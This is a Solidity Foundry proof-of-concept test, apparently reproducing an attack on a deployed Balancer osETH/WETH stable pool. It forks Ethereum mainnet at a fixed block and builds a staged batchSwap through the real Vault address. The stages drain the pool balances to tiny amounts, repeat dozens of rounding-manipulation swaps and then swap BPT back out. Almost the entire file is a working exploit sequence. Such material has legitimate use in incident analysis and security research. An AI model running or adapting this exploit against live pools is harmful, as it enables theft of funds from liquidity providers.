// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";
import {IBasePool} from "src/interfaces/IBasePool.sol";
import {IVault} from "src/interfaces/IVault.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {FixedPoint} from "src/FixedPoint.sol";
import {SwapMath} from "src/SwapMath.sol";

contract BalancerPoc is Test {
    using FixedPoint for uint256;

    SwapMath internal swapMath;
    IBasePool constant OSETH_BPT = IBasePool(address(0xDACf5Fa19b1f720111609043ac67A9818262850c));
    IVault constant VAULT = IVault(address(0xBA12222222228d8Ba445958a75a0704d566BF2C8));

    function setUp() public {
        vm.createSelectFork("ETH", 23717395);
        swapMath = new SwapMath();

        vm.label(address(OSETH_BPT), "OSETH_BPT");
        vm.label(address(VAULT), "VAULT");
        vm.label(address(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38), "osETH");
        vm.label(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), "WETH");

        // payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).call{value: 400081 ether}("");
    }

    function generateStep1Amounts(uint256 balances, uint256 swapFee, uint256 targetRemain, uint256 maxLength)
        internal
        pure
        returns (uint256 remainAmount, uint256 stepLength, uint256[] memory swapAmounts)
    {
        remainAmount = balances;
        uint256 remainAllactionFactor = FixedPoint.ONE - swapFee;
        swapAmounts = new uint256[](maxLength);
        for (uint256 i = 0; i < maxLength; i++) {
            uint256 swapAmount = (remainAmount - targetRemain) * remainAllactionFactor / FixedPoint.ONE;
            if (swapAmount == 0) {
                break;
            }
            stepLength++;
            swapAmounts[i] = swapAmount;
            remainAmount -= swapAmount;

            if (remainAmount <= targetRemain) {
                break;
            }
        }
    }

    function insertStep2Swaps(
        uint256 targetIndex,
        uint256 otherIndex,
        uint256 targetBalance,
        uint256 swapCountLimit,
        bytes32 poolId,
        uint256 amp,
        uint256 swapFeePercentage,
        uint256 swapsIndex,
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        IVault.BatchSwapStep[] memory swaps
    ) internal view {
        while (swapCountLimit > 0) {
            {
                // Step 1: targetIndex balance to targetBalance + 1
                uint256 swapOutAmount = balances[targetIndex] - targetBalance - 1;

                balances = swapMath.getAfterSwapOutBalances(
                    balances, scalingFactors, otherIndex, targetIndex, swapOutAmount, amp, swapFeePercentage
                );

                swaps[swapsIndex + 1] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: swapOutAmount, userData: ""
                });
            }
            {
                if (balances[targetIndex] != targetBalance + 1) {
                    revert("insertStep2Swaps failed");
                }
                // Step 2: targetIndex balance to 1
                uint256 swapOutAmount = targetBalance;
                balances = swapMath.getAfterSwapOutBalances(
                    balances, scalingFactors, otherIndex, targetIndex, swapOutAmount, amp, swapFeePercentage
                );
                swaps[swapsIndex + 2] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: swapOutAmount, userData: ""
                });

                console.log("Step2 After WETH balance: ", balances[otherIndex]);
                console.log("Step2 After osETH balance: ", balances[targetIndex]);
            }
            {
                // Step3: Recover otherIndex balance
                uint256 swapOutAmount = balances[otherIndex] * 999 / 1000;
                // May be error, if error need adjust swapOutAmount
                try swapMath.getAfterSwapOutBalances(
                    balances, scalingFactors, targetIndex, otherIndex, swapOutAmount, amp, swapFeePercentage
                ) returns (
                    uint256[] memory newBalances
                ) {
                    balances = newBalances;
                } catch {
                    // Adjust swapOutAmount
                    while (true) {
                        swapOutAmount = swapOutAmount * 9 / 10;
                        try swapMath.getAfterSwapOutBalances(
                            balances, scalingFactors, targetIndex, otherIndex, swapOutAmount, amp, swapFeePercentage
                        ) returns (
                            uint256[] memory newBalances
                        ) {
                            balances = newBalances;
                            break;
                        } catch {
                            continue;
                        }
                    }
                }

                swaps[swapsIndex + 3] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: 2, assetOutIndex: 0, amount: swapOutAmount, userData: ""
                });
            }

            swapCountLimit--;
            swapsIndex += 3;
        }
    }

    function generateStep3Amounts(uint256 balances, uint256 maxLength)
        public
        returns (uint256[] memory swapAmounts, uint256 stepLength)
    {
        swapAmounts = new uint256[](maxLength);

        uint256 accumulated = 10000;
        uint256 nowValue = 10000;
        swapAmounts[0] = 10000;

        for (uint256 i = 1; i < maxLength; i++) {
            if (balances > accumulated + 1000 * nowValue) {
                accumulated += 1000 * nowValue;
                nowValue = nowValue * 1000;
                swapAmounts[i] = nowValue;
                // console.log("IF swapAmounts[", i, "] =", swapAmounts[i]);
                stepLength++;
            } else {
                uint256 remain = balances - accumulated;
                swapAmounts[i] = remain;
                stepLength++;

                console.log("Step Length: ", stepLength);
                break;
            }
        }
    }

    function test_generateStep3Amounts() public {
        uint256 balances = OSETH_BPT.getActualSupply();
        console.log("Actual supply:", balances);
        (uint256[] memory swapAmounts, uint256 stepLength) = generateStep3Amounts(balances * 103 / 100, 20);
        for (uint256 i = 0; i < stepLength + 1; i++) {
            console.log("swapAmounts[", i, "] =", swapAmounts[i]);
        }
    }

    function test_run() public {
        console.log("Forked at ETH block:", block.number);
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 bptIndex = OSETH_BPT.getBptIndex();
        console.log("OSETH BPT index:", bptIndex);

        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);

        for (uint256 i = 0; i < tokens.length; i++) {
            tokens[i].approve(address(VAULT), type(uint256).max);
        }

        bool[] memory updateAddress = new bool[](tokens.length);
        (address[] memory rateProviders) = OSETH_BPT.getRateProviders();
        for (uint256 i = 0; i < rateProviders.length; i++) {
            if (rateProviders[i] != address(0)) {
                updateAddress[i] = true;
            }
        }

        for (uint256 i = 0; i < tokens.length; i++) {
            if (updateAddress[i]) {
                console.log("Updating token rate cache for token:", address(tokens[i]));
                OSETH_BPT.updateTokenRateCache(tokens[i]);
            }
        }

        uint256[] memory scalingFactors = OSETH_BPT.getScalingFactors();

        uint256 swapFeePercentage = OSETH_BPT.getSwapFeePercentage();
        (uint256 amp,,) = OSETH_BPT.getAmplificationParameter();
        uint256 bptRate = OSETH_BPT.getRate();

        uint256 targetRemainBalance = 87000;

        (uint256 remainETHAmount, uint256 stepETHLength, uint256[] memory stepETHAmount) =
            generateStep1Amounts(balances[0], swapFeePercentage, targetRemainBalance, 10);
        (uint256 remainOSETHAmount, uint256 stepOSETHLength, uint256[] memory stepOSETHAmount) =
            generateStep1Amounts(balances[2], swapFeePercentage, targetRemainBalance, 10);

        uint256 bptActualBalances = OSETH_BPT.getActualSupply();
        console.log("Actual supply:", bptActualBalances);

        (uint256[] memory stepBPTAmount, uint256 stepBPTLength) =
            generateStep3Amounts(bptActualBalances * bptRate / 1e18, 10);

        int256[] memory limits = new int256[](3);
        limits[0] = int256(1809251394333065553493296640760748560207343510400633813116524750123642650624);
        limits[1] = int256(1809251394333065553493296640760748560207343510400633813116524750123642650624);
        limits[2] = int256(1809251394333065553493296640760748560207343510400633813116524750123642650624);

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this), fromInternalBalance: true, recipient: payable(address(this)), toInternalBalance: true
        });

        uint256 step2SwapCount = 40;
        IVault.BatchSwapStep[] memory swaps =
            new IVault.BatchSwapStep[](stepETHLength + stepOSETHLength + stepBPTLength + 1 + step2SwapCount * 3);

        for (uint256 i = 0; i < stepETHLength; i++) {
            swaps[i * 2] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 1, assetOutIndex: 0, amount: stepETHAmount[i], userData: ""
            });

            swaps[i * 2 + 1] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 1, assetOutIndex: 2, amount: stepOSETHAmount[i], userData: ""
            });
        }

        uint256[] memory notBPTBalances = new uint256[](tokens.length - 1);
        notBPTBalances[0] = remainETHAmount;
        notBPTBalances[1] = remainOSETHAmount;

        uint256[] memory notBPTScalingFactors = new uint256[](tokens.length - 1);
        notBPTScalingFactors[0] = scalingFactors[0];
        notBPTScalingFactors[1] = scalingFactors[2];

        // Insert Step 2 swaps
        insertStep2Swaps(
            1,
            0,
            17,
            step2SwapCount,
            poolId,
            amp,
            swapFeePercentage,
            stepETHLength + stepOSETHLength - 1,
            notBPTBalances,
            notBPTScalingFactors,
            swaps
        );

        // console.log("stepBPTLength: ", stepBPTLength);
        for (uint256 i = 0; i < stepBPTLength + 1; i++) {
            if (i % 2 == 0) {
                swaps[stepETHLength + stepOSETHLength + step2SwapCount * 3 + i] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: 0, assetOutIndex: 1, amount: stepBPTAmount[i], userData: ""
                });
            } else {
                swaps[stepETHLength + stepOSETHLength + step2SwapCount * 3 + i] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: 2, assetOutIndex: 1, amount: stepBPTAmount[i], userData: ""
                });
            }
        }

        VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, swaps, tokens, funds, limits, block.timestamp + 1);
        // OSETH_BPT.updateTokenRateCache()
    }
}
